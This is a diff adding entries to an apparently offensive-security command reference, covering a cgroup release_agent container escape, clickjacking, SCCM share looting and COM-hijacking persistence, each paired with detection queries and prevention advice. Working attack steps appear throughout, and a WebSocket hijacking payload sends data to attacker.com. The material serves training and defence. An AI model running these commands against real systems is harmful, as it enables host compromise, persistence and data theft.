+            "false_positives": "Genuine administrator-driven dMSA migrations also set this attribute.",
+            "tuning": "Alert when the attribute is written by an account outside the service-account admin group, or when the linked principal is a privileged/Tier 0 object."
+          }
+        ]
+      }
     },
     {
       "id": "linux-baron-samedit",
@@ -21391,6 +22796,111 @@ const COMMAND_DATA = {
       "explain": "Builds a target-specific wordlist by crawling their website:\n  cewl <url>               spider this site\n  -d <depth>               crawl to this link depth\n  -m <min_length>          keep words at least this long\n  --lowercase              lowercase the output\n  -w wordlist.txt          save the harvested words\nGreat for org-specific candidates generic lists miss; --with-numbers keeps numeric words, -e also harvests emails."
     },
     {
+      "id": "linux-cgroup-release-agent-escape",
+      "name": "cgroup v1 release_agent privileged-container escape",
+      "command": "echo <host_script> > /sys/fs/cgroup/<ctrl>/release_agent   # host runs it as root",
+      "description": "A privileged (or CAP_SYS_ADMIN, SYS_ADMIN-granted) container that can mount a cgroup v1 controller can abuse the release_agent mechanism to execute a command on the HOST as root. The attacker mounts an RDMA (or other) cgroup controller, writes a host-path script into release_agent, enables notify_on_release on a child cgroup, and then empties that cgroup; the kernel runs the release_agent script in the host's root namespace. Classic privileged-container breakout.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Container Escape",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Unit 42 / Trailofbits / cgroup release_agent escape",
+      "tags": [
+        "cgroup",
+        "release-agent",
+        "notify-on-release",
+        "container-escape",
+        "cap-sys-admin",
+        "privesc"
+      ],
+      "mitre": [
+        "T1611"
+      ],
+      "exam": "lab-only",
+      "notes": "=== WHAT IT IS ===\n  cgroup v1 supports a 'release_agent': a host-side program the kernel runs (as root,\n  in the host namespace) when the last task leaves a cgroup that has notify_on_release=1.\n  A container that can mount a cgroup controller can set release_agent to its own\n  script and trigger it -> code execution on the host.\n\n=== PREREQUISITES ===\n  # Container must have CAP_SYS_ADMIN (e.g. docker run --privileged or --cap-add=SYS_ADMIN)\n  capsh --print | grep sys_admin\n  # cgroup v1 present (release_agent does not exist in pure cgroup v2)\n  ls /sys/fs/cgroup\n\n=== EXPLOIT (inside the container) ===\n  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n  echo 1 > /tmp/cgrp/x/notify_on_release\n  # find this container's path on the host:\n  host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n  cat > /cmd <<EOF\n  #!/bin/sh\n  ps aux > $host_path/output\n  EOF\n  chmod +x /cmd\n  # trigger: spawn then exit a process in the child cgroup\n  sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n  cat /output      # command ran on the host as root\n\n=== TURN INTO ROOT SHELL ===\n  # make /cmd drop a host reverse shell or 'cp /bin/bash /host/tmp/rootbash; chmod 4755 ...'\n\n=== ALTERNATIVES ===\n  runc leaky-vessels (CVE-2024-21626); docker-socket abuse; --privileged /dev host-disk mount",
+      "examples": [
+        {
+          "label": "Confirm CAP_SYS_ADMIN and cgroup v1",
+          "command": "capsh --print | grep sys_admin; ls /sys/fs/cgroup"
+        },
+        {
+          "label": "Mount a cgroup controller and arm notify_on_release",
+          "command": "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release"
+        },
+        {
+          "label": "Point release_agent at a host script and trigger it",
+          "command": "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
+        }
+      ],
+      "references": [
+        {
+          "title": "Unit 42 - Docker privileged container escape",
+          "url": "https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/"
+        },
+        {
+          "title": "Trail of Bits - release_agent escape explained",
+          "url": "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
+        },
+        {
+          "title": "HackTricks - Docker release_agent escape",
+          "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "linux-docker-escape",
+          "note": "Broader container-escape catalogue.",
+          "rel": "alternative"
+        },
+        {
+          "id": "linux-runc-leaky-vessels",
+          "note": "runc leaked-fd escape as a sibling technique.",
+          "rel": "alternative"
+        },
+        {
+          "id": "docker-socket-exposed",
+          "note": "Escape path when the Docker socket is mounted instead.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "cgroup v1's release_agent is a host-side program the kernel executes, as root in the host namespace, when the last process leaves a cgroup with notify_on_release set. A container with CAP_SYS_ADMIN can mount a cgroup controller and write both release_agent and notify_on_release, then empty the cgroup, causing the kernel to run the attacker's script outside the container boundary.",
+        "prerequisites": "A container running with CAP_SYS_ADMIN (e.g. --privileged or --cap-add=SYS_ADMIN) so it can mount a cgroup v1 controller, and a host exposing cgroup v1 (release_agent does not exist under pure cgroup v2). Knowledge of the container's path on the host (from /etc/mtab).",
+        "impact": "Arbitrary command execution on the host as root from inside the container - a complete escape of the container isolation boundary.",
+        "detection": "[MITRE T1611] Writes to a cgroup release_agent file and toggling notify_on_release from within a container; a container mounting a cgroup controller (mount -t cgroup); host-side execution of a script located in a container's overlay/merged directory; unexpected root processes spawned by the kernel/systemd whose path lies in a container layer.",
+        "artifacts": "auditd records of mount -t cgroup and writes to release_agent / notify_on_release / cgroup.procs; a release_agent pointing at a container overlay path; a host process whose binary resides under /var/lib/docker/overlay2; EDR container-escape alerts.",
+        "splunk_spl": "index=linux sourcetype=\"linux:auditd\"\n| search (name=\"*release_agent*\" OR name=\"*notify_on_release*\" OR proctitle=\"*mount -t cgroup*\")\n| table _time, host, auid, exe, name, proctitle",
+        "elastic_kql": "(file.path:*release_agent* or file.path:*notify_on_release*) or (process.name:mount and process.args:cgroup)",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"release_agent\",\"notify_on_release\") or (SyslogMessage has \"mount\" and SyslogMessage has \"-t cgroup\")\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// container writing cgroup release_agent to run a script on the host (T1611)",
+        "sigma_rules": "lnx_cgroup_release_agent_escape (write to release_agent + notify_on_release from a container)",
+        "prevention": "Do not run containers with --privileged or CAP_SYS_ADMIN unless strictly required; drop SYS_ADMIN and all unneeded capabilities. Prefer cgroup v2 (no release_agent). Enforce seccomp/AppArmor/SELinux profiles that block mount and cgroup writes; use user namespaces for containers. Monitor for release_agent writes.",
+        "sources": [
+          "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/",
+          "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "cgroup release_agent write from container (escape)",
+            "logic": "Syslog\n| where SyslogMessage has_any (\"release_agent\",\"notify_on_release\") or (SyslogMessage has \"mount\" and SyslogMessage has \"-t cgroup\")\n| project TimeGenerated, Computer, SyslogMessage",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1611"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate workloads almost never write release_agent; some older container tooling mounts cgroup controllers.",
+            "tuning": "Alert on any write to a release_agent file from a container context; correlate with a host process running from a container overlay path."
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-printerbug-enum",
       "name": "Check Print Spooler Status on Domain Hosts",
       "command": "Import-Module .\\SecurityAssessment.ps1\nGet-SpoolStatus -ComputerName ACADEMY-EA-DC01",
@@ -22247,6 +23757,110 @@ const COMMAND_DATA = {
       "explain": "Chisel builds a SOCKS5 tunnel over HTTP through a firewall:\n  server        run the server end\n  -v            verbose logging\n  -p <port>     port the server listens on\n  --socks5      expose a SOCKS5 proxy over the tunnel\nThe client connects with 'socks' (forward) or 'R:socks' (reverse, with --reverse on the server); either way you get a proxy on 127.0.0.1:1080 to point proxychains at."
     },
     {
+      "id": "web-clickjacking",
+      "name": "Clickjacking (Frame-Based UI Redress)",
+      "command": "<iframe src=\"https://<target>/account\" style=\"opacity:0.0001;position:absolute;top:0;left:0\"></iframe>",
+      "description": "UI-redress attack that frames a target application inside an invisible/transparent iframe over decoy content, so the victim's clicks land on sensitive controls (delete account, change email, approve OAuth, transfer funds) they cannot see. Exploits missing X-Frame-Options / CSP frame-ancestors. Covers the opacity-overlay PoC, drag-and-drop and prefilled-form variants, and chaining a framed action with a prefilled input.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web",
+      "subcategory": "Client-Side",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - Clickjacking",
+      "tags": [
+        "clickjacking",
+        "ui-redress",
+        "x-frame-options",
+        "frame-ancestors",
+        "csp"
+      ],
+      "mitre": [
+        "T1185"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  If a page can be framed (no X-Frame-Options / no CSP frame-ancestors), an attacker overlays it transparently on top of bait content and aligns a decoy button under a real sensitive control. The victim 'clicks the bait' but actually clicks the framed app while authenticated.\n\n=== BASIC OPACITY-OVERLAY PoC ===\n  <style>\n    iframe { position:absolute; top:0; left:0; width:1000px; height:700px; opacity:0.0001; z-index:2; }\n    #decoy { position:absolute; z-index:1; }\n  </style>\n  <div id=\"decoy\"><button style=\"position:absolute;top:310px;left:60px\">Claim prize</button></div>\n  <iframe src=\"https://<target>/account/delete\"></iframe>\n  Align the decoy button under the real 'Confirm' button (tweak top/left; set opacity to 0.5 while aligning, then to ~0).\n\n=== PREFILLED-FORM VARIANT ===\n  - Load the framed app with a URL that prefills a form (e.g. /email/change?email=attacker@evil.com) so a single framed click submits attacker data.\n\n=== DRAG-AND-DROP / MULTISTEP ===\n  - Trick the user into dragging a token into a field, or chain two aligned clicks.\n\n=== BYPASS NOTES ===\n  - frame-busting JS alone is weak; test if the site relies only on JS (sandbox the iframe to neuter busting: <iframe sandbox=\"allow-forms allow-scripts\">, but note sandbox also blocks top-nav).\n\n=== TOOLING ===\n  - Burp 'Clickbandit' (Burp > top menu > Burp > Clickbandit) records a working PoC automatically.",
+      "examples": [
+        {
+          "label": "Minimal transparent-overlay PoC",
+          "command": "<iframe src=\"https://<target>/account\" style=\"opacity:0.0001;position:absolute;top:0;left:0;width:1000;height:700\"></iframe>"
+        },
+        {
+          "label": "Prefilled form so one click submits attacker data",
+          "command": "<iframe src=\"https://<target>/email/change?email=attacker@evil.com\"></iframe>"
+        },
+        {
+          "label": "Check framing protection headers",
+          "command": "curl -sI https://<target>/account | grep -iE 'x-frame-options|content-security-policy'"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - Clickjacking (UI redressing)",
+          "url": "https://portswigger.net/web-security/clickjacking"
+        },
+        {
+          "title": "OWASP - Clickjacking",
+          "url": "https://owasp.org/www-community/attacks/Clickjacking"
+        },
+        {
+          "title": "MDN - CSP frame-ancestors",
+          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "xss-phishing-form",
+          "note": "Both coerce victim interaction - phishing form vs invisible frame.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cors-misconfiguration",
+          "note": "Another client-side trust-boundary flaw to test on the same app.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-postmessage-exploitation",
+          "note": "framed pages often also expose postMessage origin flaws.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Without X-Frame-Options or a CSP frame-ancestors directive, the browser lets any site embed the app in an iframe. An attacker renders it transparently over decoy content so authenticated clicks are redirected to sensitive controls.",
+        "prerequisites": "A sensitive, state-changing page that can be framed (no anti-framing header) and a victim who is authenticated and interacts with the attacker's bait page.",
+        "impact": "Unintended sensitive actions performed as the victim - account deletion, email/password change, OAuth consent, fund transfer, or privilege changes - without stealing credentials.",
+        "detection": "[MITRE T1185] Largely a client-side attack with limited server telemetry; look for sensitive-action requests whose Referer/Sec-Fetch-Dest indicate an iframe/cross-site origin, and for responses that are being served without framing-protection headers.",
+        "artifacts": "Web access logs with Referer and Sec-Fetch-Dest=iframe / Sec-Fetch-Site=cross-site on sensitive endpoints, and header-audit reports showing missing X-Frame-Options / frame-ancestors.",
+        "splunk_spl": "index=web (uri_path=\"/account/delete\" OR uri_path=\"/email/change\")\n| rex field=_raw \"Sec-Fetch-Dest:\\s*(?<dest>\\S+)\"\n| rex field=_raw \"Sec-Fetch-Site:\\s*(?<site>\\S+)\"\n| where dest=\"iframe\" OR site=\"cross-site\"\n| stats count by clientip, uri_path, site",
+        "elastic_kql": "url.path:(\"/account/delete\" or \"/email/change\") and http.request.headers.sec-fetch-dest:\"iframe\"",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem in (\"/account/delete\",\"/email/change\")\n| extend secFetchSite = extract(@\"Sec-Fetch-Site:\\s*(\\S+)\", 1, csHeaders)\n| where secFetchSite == \"cross-site\"\n| summarize count() by cIP, csUriStem",
+        "sigma_rules": "web_clickjacking_cross_site_iframe_action",
+        "prevention": "Send Content-Security-Policy: frame-ancestors 'self' (or an explicit allow-list) on all pages, plus X-Frame-Options: DENY/SAMEORIGIN for legacy browsers. Require re-authentication or an un-prefillable confirmation step for destructive actions. Set SameSite cookies. Do not rely on JavaScript frame-busting alone.",
+        "sources": [
+          "https://portswigger.net/web-security/clickjacking",
+          "https://owasp.org/www-community/attacks/Clickjacking"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Sensitive action requested from a cross-site iframe context",
+            "logic": "index=web sourcetype=nginx (uri_path=\"/account/delete\" OR uri_path=\"/email/change\")\n| rex field=_raw \"Sec-Fetch-Dest:\\s*(?<dest>\\S+)\"\n| rex field=_raw \"Sec-Fetch-Site:\\s*(?<site>\\S+)\"\n| where dest=\"iframe\" OR site=\"cross-site\"\n| stats count by clientip, uri_path, site",
+            "data_source": "nginx",
+            "attack": [
+              "T1185"
+            ],
+            "fidelity": "telemetry",
+            "confidence": "low",
+            "false_positives": "Legitimate embedded widgets or same-org iframes; older browsers omit Sec-Fetch-* headers.",
+            "tuning": "Combine with the absence of framing-protection headers on the response and focus on destructive endpoints only."
+          }
+        ]
+      }
+    },
+    {
       "id": "client-recon-fingerprint",
       "name": "Client-Side Recon - Fingerprint the Target",
       "command": "python3 -m http.server 80   # watch the User-Agent of the machine that connects",
@@ -22711,6 +24325,112 @@ const COMMAND_DATA = {
             "confidence": "medium",
             "false_positives": "CSPM tools, inventory automation, backup scanners",
             "tuning": "Baseline per-identity service breadth; allowlist known automation roles"
+          }
+        ]
+      }
+    },
+    {
+      "id": "sccm-cmloot-dp-looting",
+      "name": "CMLoot - SCCM Distribution Point Looting",
+      "command": "Invoke-CMLootInventory -SCCMHost <target> -Outfile inventory.txt",
+      "description": "SCCM Distribution Points expose package content over an (often anonymously readable) SMB share (SCCMContentLib$ / the DataLib). CMLoot reads the DataLib .INI index to enumerate every file staged on the DP, then selectively downloads them - scripts, MSIs, configuration files, and task-sequence content that frequently contain hardcoded credentials, connection strings, and secrets. This is a low-noise, pre-auth-adjacent loot of the whole software estate.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "SCCM Attacks",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "1njection/CMLoot",
+      "tags": [
+        "sccm",
+        "mecm",
+        "cmloot",
+        "distribution-point",
+        "smb",
+        "loot",
+        "credential-access"
+      ],
+      "mitre": [
+        "T1552.001",
+        "T1039"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INVENTORY THE DP (read the DataLib index) ===\n  # PowerShell (original CMLoot):\n  Invoke-CMLootInventory -SCCMHost <target> -Outfile inventory.txt\n  # Enumerates \\\\<dp>\\SCCMContentLib$ via the .INI files in DataLib - no download yet\n\n=== DOWNLOAD SELECTIVELY ===\n  # Grab everything of a given extension (scripts are gold):\n  Invoke-CMLootDownload -InventoryFile inventory.txt -Extension ps1\n  Invoke-CMLootDownload -InventoryFile inventory.txt -Extension config\n  # Or pull a single file:\n  Invoke-CMLootDownload -SingleFile \\\\<dp>\\SCCMContentLib$\\DataLib\\<pkg>\n\n=== HUNT FOR SECRETS ===\n  # After download, grep the loot for creds/connection strings:\n  Select-String -Path .\\CMLootOut\\* -Pattern \"password|pwd|connectionString|secret|apikey\"\n  # Python port offers the same against anonymous SMB:\n  cmloot.py <dc_ip>/<user>:<password>@<target>\n\n=== WHY IT WORKS ===\n  - SCCMContentLib$ is commonly readable by Authenticated Users (sometimes anonymous).\n  - Packaged scripts/installers embed service-account creds and API keys.\n\n=== ALTERNATIVES ===\n  snaffler / PowerHuntShares    # general share credential hunting\n  SharpSCCM get secrets         # NAA / policy secrets instead of content",
+      "examples": [
+        {
+          "label": "Inventory DP content index",
+          "command": "Invoke-CMLootInventory -SCCMHost <target> -Outfile inventory.txt"
+        },
+        {
+          "label": "Download all PowerShell scripts",
+          "command": "Invoke-CMLootDownload -InventoryFile inventory.txt -Extension ps1"
+        },
+        {
+          "label": "Loot via the Python port",
+          "command": "cmloot.py <dc_ip>/<user>:<password>@<target>"
+        }
+      ],
+      "references": [
+        {
+          "title": "CMLoot",
+          "url": "https://github.com/1njection/CMLoot"
+        },
+        {
+          "title": "Misconfiguration Manager - CRED-5 (DP looting)",
+          "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sccm-sccmhunter-recon",
+          "note": "Identify the Distribution Points to loot.",
+          "rel": "prereq"
+        },
+        {
+          "id": "sccm-naa-credential-extract",
+          "note": "Policy secrets are a parallel SCCM credential source.",
+          "rel": "alternative"
+        },
+        {
+          "id": "snaffler",
+          "note": "General share hunting for credentials beyond the DP.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Distribution Point content is served from the SCCMContentLib$ SMB share, whose DataLib holds an .INI index of every staged file. Default ACLs often permit Authenticated Users (or anonymous) read, so any domain user can enumerate and pull packaged scripts and installers that commonly embed secrets.",
+        "prerequisites": "SMB read access to \\\\<dp>\\SCCMContentLib$ - usually a domain account, sometimes anonymous on misconfigured DPs.",
+        "impact": "Disclosure of hardcoded credentials, connection strings, and API keys embedded in deployed packages/scripts, enabling privilege escalation and lateral movement.",
+        "detection": "[MITRE T1039] High-volume read access to SCCMContentLib$ / DataLib from a single account; access to many .INI index files followed by bulk file reads from a non-SCCM host.",
+        "artifacts": "Windows file-share audit (5140/5145) on SCCMContentLib$; Sysmon network connections to TCP 445 on the DP; bulk SMB reads of DataLib .INI files.",
+        "splunk_spl": "index=windows EventCode=5145 Share_Name=\"*SCCMContentLib*\"\n| stats count dc(Relative_Target_Name) as files by Account_Name, src_ip\n| where files > 50",
+        "elastic_kql": "event.code:\"5145\" and winlog.event_data.ShareName:*SCCMContentLib*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5145\n| where ShareName has \"SCCMContentLib\"\n| summarize Files=dcount(RelativeTargetName) by SubjectUserName, IpAddress, bin(TimeGenerated, 1h)\n| where Files > 50",
+        "sigma_rules": "win_sccm_contentlib_mass_read",
+        "prevention": "Restrict SCCMContentLib$ ACLs to required accounts; never embed credentials in packaged scripts/installers (use runtime secret retrieval); audit deployed content for secrets; enable share access auditing and alert on bulk DataLib enumeration from non-SCCM hosts.",
+        "sources": [
+          "https://github.com/1njection/CMLoot",
+          "https://github.com/subat0mik/Misconfiguration-Manager"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Mass read of SCCM Distribution Point content share",
+            "logic": "SecurityEvent\n| where EventID == 5145\n| where ShareName has \"SCCMContentLib\"\n| summarize Files=dcount(RelativeTargetName) by SubjectUserName, IpAddress, bin(TimeGenerated, 1h)\n| where Files > 50",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5145"
+            ],
+            "attack": [
+              "T1039"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "SCCM clients and content-distribution processes read this share routinely.",
+            "tuning": "Baseline normal client access; alert on bulk DataLib reads from workstation/non-client source IPs."
           }
         ]
       }
@@ -23831,6 +25551,131 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Exploits the ColdFusion FCKeditor upload flaw for unauth RCE (CVE-2009-2265):\n  python3 50057.py   the EDB exploit, after editing lhost/lport/rhost/rport inside it\nColdFusion 8.0.1 and earlier ship a vulnerable FCKeditor file manager; the script uploads a JSP payload and triggers a shell - fetch it with 'searchsploit -p 50057' and set the callback details before running."
+    },
+    {
+      "id": "persist-com-hijacking",
+      "name": "COM Hijacking Persistence (HKCU CLSID InprocServer32)",
+      "command": "reg add \"HKCU\\Software\\Classes\\CLSID\\{<clsid>}\\InprocServer32\" /ve /d <dll> /f",
+      "description": "COM hijacking persists by registering a per-user CLSID entry under HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32 that points at a malicious DLL. Because HKCU is searched before HKLM for COM resolution, any process that instantiates that CLSID loads the attacker DLL instead of the real one - executing code in the victim's context whenever the hijacked (often abandoned or scheduled) COM object is called, with no admin rights required.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Persistence",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1546.015; public COM-hijacking research",
+      "tags": [
+        "com-hijacking",
+        "persistence",
+        "hkcu",
+        "clsid",
+        "inprocserver32",
+        "dll"
+      ],
+      "mitre": [
+        "T1546.015",
+        "T1574.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CORE IDEA ===\n  COM resolution checks HKCU\\Software\\Classes\\CLSID before HKLM\\...\\CLSID. A user can write HKCU,\n  so planting an InprocServer32 there shadows a per-machine COM server without admin.\n\n=== REGISTER (per-user, no admin) ===\n  reg add \"HKCU\\Software\\Classes\\CLSID\\{<clsid>}\\InprocServer32\" /ve /d \"C:\\Users\\<user>\\evil.dll\" /f\n  reg add \"HKCU\\Software\\Classes\\CLSID\\{<clsid>}\\InprocServer32\" /v ThreadingModel /d Apartment /f\n\n=== PICKING A TARGET CLSID ===\n  - Abandoned/missing CLSIDs referenced by scheduled tasks or Explorer (Process Monitor:\n    filter RegOpenKey on InprocServer32 with result NAME NOT FOUND -> hijackable).\n  - A CLSID loaded by a frequently-run task gives reliable, recurring execution.\n\n=== TRIGGER ===\n  Whenever the victim or a scheduled task instantiates the CLSID, the DLL's DllMain/DllGetClassObject runs.\n\n=== ALTERNATIVES ===\n  Classic DLL search-order hijack, Run keys, WMI subscription - COM hijack is quieter (HKCU, no new file in startup).",
+      "examples": [
+        {
+          "label": "Find hijackable CLSIDs with Process Monitor (NAME NOT FOUND on InprocServer32)",
+          "command": "procmon /AcceptEula /Quiet /Minimized"
+        },
+        {
+          "label": "Register the per-user hijack",
+          "command": "reg add \"HKCU\\Software\\Classes\\CLSID\\{<clsid>}\\InprocServer32\" /ve /d <dll> /f"
+        },
+        {
+          "label": "Hunt: list all HKCU CLSID InprocServer32 entries (defender)",
+          "command": "reg query HKCU\\Software\\Classes\\CLSID /s /f InprocServer32"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1546.015 - Component Object Model Hijacking",
+          "url": "https://attack.mitre.org/techniques/T1546/015/"
+        },
+        {
+          "title": "Microsoft - Registering COM Applications",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/com/registering-com-applications"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "dll-hijacking",
+          "note": "DLL search-order hijacking is the non-COM equivalent.",
+          "rel": "alternative"
+        },
+        {
+          "id": "persist-registry-run-keys",
+          "note": "Run keys are a simpler, more visible registry persistence.",
+          "rel": "alternative"
+        },
+        {
+          "id": "persist-wmi-event-subscription",
+          "note": "WMI subscriptions are another fileless persistence mechanism.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The COM runtime resolves a CLSID by checking the per-user hive (HKCU\\Software\\Classes) before the per-machine hive. A standard user can write HKCU, so an InprocServer32 planted there shadows the legitimate server for that user, and any process that creates the object in that session loads the attacker DLL - no admin and no change to protected machine keys.",
+        "prerequisites": "A user-context write to HKCU (no admin). A worthwhile target CLSID - ideally one that is abandoned (missing server) or instantiated by a recurring task - plus a DLL on disk.",
+        "impact": "T1546.015 COM Hijacking. Recurring code execution in the victim's context (and potentially higher if a privileged process loads the CLSID), surviving reboots without any classic autostart footprint.",
+        "detection": "Monitor registry writes to HKCU\\Software\\Classes\\CLSID\\*\\InprocServer32 (Sysmon EID 12/13), especially pointing at a DLL in a user-writable path; alert on unusual DLLs loaded by Explorer/taskhostw/svchost that resolve from an HKCU CLSID; compare HKCU CLSID entries against the legitimate HKLM definitions.",
+        "artifacts": "Sysmon EID 13 (RegistryValueSet) on InprocServer32 under HKCU; Sysmon EID 7 (ImageLoad) of a user-path DLL by a COM client; Autoruns COM entries flagged under the current user; the planted DLL on disk.",
+        "splunk_spl": "index=sysmon EventCode=13 TargetObject=\"*\\\\Software\\\\Classes\\\\CLSID\\\\*\\\\InprocServer32*\"\n| search Details=\"*\\\\Users\\\\*\" OR Details=\"*\\\\AppData\\\\*\" OR Details=\"*\\\\Temp\\\\*\"\n| table _time, Computer, Image, TargetObject, Details",
+        "elastic_kql": "event.code:\"13\" and registry.path:*\\\\Software\\\\Classes\\\\CLSID\\\\*\\\\InprocServer32* and registry.data.strings:(*\\\\Users\\\\* or *\\\\AppData\\\\* or *\\\\Temp\\\\*)",
+        "sentinel_kql": "DeviceRegistryEvents\n| where RegistryKey has \"\\\\Software\\\\Classes\\\\CLSID\\\\\" and RegistryKey endswith \"InprocServer32\"\n| where RegistryValueData has_any (\"\\\\Users\\\\\",\"\\\\AppData\\\\\",\"\\\\Temp\\\\\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueData",
+        "sigma_rules": "registry_set_com_hijack_hkcu_inprocserver32",
+        "prevention": "Baseline per-user HKCU CLSID entries and alert on new InprocServer32 values (legitimate ones are rare per user); restrict write access to user-writable DLL directories and enforce WDAC/ASR so unsigned DLLs cannot load; periodically run Autoruns to review user COM registrations; prefer per-machine COM registration and remove abandoned CLSIDs attackers could shadow.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1546/015/",
+          "https://learn.microsoft.com/en-us/windows/win32/com/registering-com-applications"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "HKCU CLSID InprocServer32 set to a user-writable DLL",
+            "logic": "DeviceRegistryEvents\n| where RegistryKey has \"\\\\Software\\\\Classes\\\\CLSID\\\\\" and RegistryKey endswith \"InprocServer32\"\n| where RegistryValueData has_any (\"\\\\Users\\\\\",\"\\\\AppData\\\\\",\"\\\\Temp\\\\\",\"\\\\ProgramData\\\\\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueData",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1546.015"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Some user-scoped applications register per-user COM servers",
+            "tuning": "Allowlist known per-user COM servers by DLL path/signature"
+          },
+          {
+            "platform": "splunk",
+            "name": "COM client loading a DLL resolved from an HKCU CLSID",
+            "logic": "index=sysmon EventCode=7 Image IN (\"*explorer.exe\",\"*taskhostw.exe\",\"*svchost.exe\") ImageLoaded IN (\"*\\\\Users\\\\*\",\"*\\\\AppData\\\\*\")\n| table _time, Computer, Image, ImageLoaded, Signed",
+            "data_source": "sysmon",
+            "attack": [
+              "T1546.015",
+              "T1574.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "User-profile plugins and add-ins loaded by Explorer",
+            "tuning": "Weight unsigned ImageLoaded higher; correlate with a preceding registry set"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "defender-endpoint"
+          ],
+          "better_with": [
+            "edr"
+          ]
+        }
+      }
     },
     {
       "type": "payload",
@@ -32264,6 +34109,112 @@ const COMMAND_DATA = {
       "explain": "Builds a public C exploit into a Windows PE from Kali using MinGW:\n  i686-w64-mingw32-gcc   the 32-bit Windows cross-compiler\n  exploit.c -o exploit.exe   source in, PE executable out\n  -lws2_32               link Winsock (needed by network exploits)\nProduces a runnable Windows binary without touching a Windows box; use x86_64-w64-mingw32-gcc for 64-bit targets and plain gcc (with -static) for Linux PoCs - match the target architecture or it will not run."
     },
     {
+      "id": "web-websocket-hijacking",
+      "name": "Cross-Site WebSocket Hijacking (CSWSH)",
+      "command": "var ws = new WebSocket('wss://<target>/chat'); ws.onmessage = e => fetch('https://attacker.com/?'+btoa(e.data));",
+      "description": "A CSRF-equivalent against WebSockets: the server authenticates the WS handshake using only ambient cookies and does not validate the Origin header, so an attacker page opens a cross-site socket in the victim's authenticated context and reads/sends messages. Covers detecting a cookie-authenticated handshake with no Origin/CSRF check, the attacker-page PoC that exfiltrates streamed messages, and sending privileged commands over the hijacked socket.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Client-Side",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - WebSockets",
+      "tags": [
+        "websocket",
+        "cswsh",
+        "csrf",
+        "origin",
+        "session-hijacking"
+      ],
+      "mitre": [
+        "T1190",
+        "T1539"
+      ],
+      "exam": "exam-ok",
